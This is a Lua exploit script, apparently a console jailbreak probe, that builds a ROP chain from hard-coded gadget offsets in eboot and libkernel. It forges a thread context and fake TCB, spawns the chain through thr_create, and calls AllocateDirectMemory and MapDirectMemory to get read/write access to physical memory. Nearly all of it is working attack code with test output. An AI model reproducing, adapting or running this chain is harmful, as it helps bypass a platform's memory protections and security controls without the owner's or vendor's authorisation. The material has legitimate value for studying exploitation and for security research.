-- CRASH_CLASS: HIGH
-- PROBE 531x: Full MapDirectMemory via thr_create ROP chain
--
-- S1 ✓ (531v): basic chain
-- S2 ✓ (531w): sysarch(165) for TLS
-- S3: AllocateDirectMemory → MapDirectMemory → R/W test
--
-- Chain: sysarch → MapDirectMemory(out_ptr, len, prot, flags, phys, align, name)
-- r8/r9 from initial context (phys offset, alignment)

print("=== PROBE 531x: MAPDM FULL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

-- Get eboot + libkernel
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
print("lk=" .. q(lk))

-- Gadgets (all verified 531u)
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)
local alloc_fn = lk + uint64(0x17EF0)
local map_fn = lk + uint64(0x15020)

-- [A] AllocateDirectMemory from main thread (via fcall)
print("[A] Alloc phys")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FAIL") return end

-- [B] Setup pages
print("[B] Setup")
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)
wq(shared + 0x00, uint64(0))        -- VA output (MapDM writes here)
wq(shared + 0x08, uint64(0xAAAA))   -- sysarch rv
wq(shared + 0x10, uint64(0xBBBB))   -- MapDM rv
wq(shared + 0x18, uint64(0xCCCC))   -- done marker

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- Fake TCB
local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

print("  shared=" .. q(shared))
print("  stack=" .. q(stack_base))
print("  tcb=" .. q(tcb_page))

-- [C] Build ROP chain
print("[C] Chain")

-- Chain near top of 2MB stack (plenty of space below for MapDM's internal frame)
local chain = stack_base + 0x200000 - 0x800
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- Phase 1: sysarch(165, SET_FSBASE=129, &tcb)
emit(uint64(165))         -- rax = 165
emit(pop_rdi_ret)
emit(uint64(129))         -- rdi = 129
emit(pop_rsi_ret)
emit(uint64(tcb_ptr))     -- rsi = &tcb_ptr
emit(syscall_ret)         -- sysarch(165)

-- Store sysarch rv
emit(pop_rdi_ret)
emit(shared + 0x08)
emit(mov_rdi_rax_ret)     -- shared[0x08] = sysarch rv

-- Phase 2: MapDirectMemory(out_ptr, len, prot, flags, phys, align, name)
-- r8 = phys (from initial context), r9 = align (from initial context)
-- Syscall preserves r8-r15, so they survive sysarch

-- rdi = out_ptr (where kernel writes the VA)
emit(pop_rdi_ret)
emit(shared + 0x00)       -- shared[0] = VA output
-- rsi = len
emit(pop_rsi_ret)
emit(uint64(0x4000))      -- 16KB
-- rdx = prot
emit(pop_rdx_ret)
emit(uint64(3))           -- RW
-- rcx = flags
emit(pop_rcx_ret)
emit(uint64(0))           -- 0

-- Now "call" map_fn: the next ret pops map_fn into RIP.
-- At map_fn entry, RSP points to [return_addr, 7th_arg(name)]
emit(map_fn)              -- ret → MapDirectMemory

-- These are on the stack when map_fn executes:
-- [rsp] = return address (where map_fn's epilogue rets to)
-- [rsp+8] = 7th argument (name = NULL)
local post_map_off = i + 16  -- skip return_addr and name
local post_map = chain + post_map_off
emit(uint64(post_map))   -- return address
emit(uint64(0))           -- name = NULL (7th arg)

-- Post-map: rax = MapDirectMemory return value
-- Store map rv
emit(pop_rdi_ret)         -- = post_map location
emit(shared + 0x10)
emit(mov_rdi_rax_ret)     -- shared[0x10] = MapDM rv

-- Done marker
emit(pop_rdi_ret)
emit(shared + 0x18)
emit(pop_rax_ret)
emit(uint64(0x444F4E45))  -- "DONE"
emit(mov_rdi_rax_ret)     -- shared[0x18] = done

-- thr_exit
emit(pop_rax_ret)
emit(uint64(431))
emit(syscall_ret)

print(string.format("  chain=%d bytes (%d entries)", i, i/8))

-- [D] Context
print("[D] Context")
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)
wq(ctx + 0x0F8, chain)
-- r8 = phys, r9 = alignment
wq(ctx + 0x068, phys)
wq(ctx + 0x070, uint64(0x4000))

print("  r8(phys)=" .. q(phys))

-- [E] Spawn
print("[E] thr_create")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

if to_num(rv_tc) ~= 0 then
    print("  CONTEXT REJECTED")
    print("=== 531x DONE ===")
    return
end

-- [F] Wait for done marker
print("[F] Wait")
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 100000000)  -- 100ms
local done = false
for attempt = 1, 30 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local m = rq(shared + 0x18)
    if m then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 and mn ~= 0xCCCC then
            done = true
            break
        end
    end
end

-- [G] Results
print("[G] Results")
print("  sysarch=" .. q(rq(shared + 0x08)))
print("  map_rv=" .. q(rq(shared + 0x10)))
print("  va=" .. q(rq(shared + 0x00)))
print("  done=" .. q(rq(shared + 0x18)) .. " (" .. tostring(done) .. ")")

local va_out = rq(shared + 0x00)
if va_out and to_num(va_out) ~= 0 then
    print("")
    print("[H] *** MAPPED PHYSICAL MEMORY ***")
    local van = to_num(va_out)
    -- Write test
    local ok_w = pcall(function() memory.write_dword(van, 0xCAFEBABE) end)
    local rb_val = rd(van)
    if rb_val then
        if rb_val < 0 then rb_val = rb_val + 0x100000000 end
        print(string.format("  write 0xCAFEBABE → read 0x%08X", rb_val))
        if rb_val == 0xCAFEBABE then
            print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
        end
    else
        print("  READ FAULT at VA " .. q(va_out))
    end

    -- Read first 64 bytes
    print("  First 64 bytes:")
    for off = 0, 0x3C, 4 do
        local d = rd(van + off)
        if d then
            if d < 0 then d = d + 0x100000000 end
            print(string.format("  [+0x%02X] 0x%08X", off, d))
        else
            print(string.format("  [+0x%02X] FAULT", off))
            break
        end
    end
else
    print("  NO VA returned")
    -- Check if child is alive
    local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
    print("  thr_kill=" .. tostring(to_num(rv_k)))
    -- Dump sentinels
    print("  (child may have crashed during MapDM)")
end

print("")
print("=== 531x DONE ===")
